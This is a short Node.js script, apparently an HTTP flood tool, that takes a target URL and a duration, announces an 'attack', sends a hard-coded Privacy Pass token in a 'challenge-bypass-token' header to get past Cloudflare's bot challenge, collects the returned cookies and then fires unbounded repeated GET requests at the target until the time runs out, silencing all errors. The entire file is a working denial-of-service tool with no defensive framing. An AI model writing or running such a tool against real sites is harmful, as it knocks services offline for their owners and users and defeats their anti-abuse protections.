const sjcl = require('sjcl');
const url = require('url');

const args = process.argv.slice(2);

const target = args[0];
const time = args[1];

const protocol = url.parse(target).protocol.slice(0, -1);

const req = require(protocol);

console.log('[CFC] - Started Attack on %s', target);

process.on('uncaughtException', e => { });
process.on('uncaughtRejection', e => { });
process.warn = () => { };

const privacyPass = {
    type: 'Redeem',
    contents: [
        [99, 192, 212, 37, 48, 234, 19, 228, 110, 173, 182, 218, 108, 175, 105, 99, 87, 66, 198, 42, 56, 58, 255, 34, 17, 131, 158, 249, 75, 214, 7, 103],
        [60, 89, 41, 65, 117, 163, 125, 237, 255, 69, 21, 178, 141, 35, 110, 68, 197, 188, 56, 180, 77, 164, 53, 216, 57, 146, 74, 233, 80, 5, 82, 220]
    ]
};

let bypassToken = Buffer.from(JSON.stringify(privacyPass)).toString('base64');

setInterval(() => {

    var headers = {};
    headers['challenge-bypass-token'] = bypassToken;

    req.get(target, res => {
        headers.cookie = res.headers['set-cookie'].shift().split(';').shift();
        req.get(target, {
            headers: headers
        }, res => {
            console.log(res);
            headers.cookie += '; ' + res.headers['set-cookie'].shift().split(';').shift();
            setInterval(() => {
                req.get(target, {
                    headers: {
                        'cookie': headers.cookie
                    }
                }, res => console.log('[CFC] - URL: %s | Status Code: %s', target, res.statusCode));
            });
        });
    });

});

setTimeout(() => {
    console.log('[CFC] - Attack Finished');
    process.exit(1);
}, time * 1000);